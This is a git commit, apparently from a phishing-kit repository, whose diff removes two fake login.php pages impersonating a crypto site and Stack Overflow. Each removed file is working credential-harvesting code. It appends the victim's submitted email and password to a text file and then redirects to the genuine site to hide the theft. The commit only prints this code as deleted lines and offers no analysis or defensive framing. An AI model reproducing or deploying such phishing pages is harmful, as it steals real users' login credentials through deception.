62ccdd76707773049ade781a769cdea2ed8a7308
htr-tech <htr404@protonmail.com>
2020-04-05 13:31:53 +0600

    Page Removed

--- websites/cryptocoinsniper/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-    file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: http://www.cryptocoinsniper.co/members/members/login/');
-exit();
--- websites/stackoverflow/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://stackoverflow.com/users/account-recovery');
-exit();
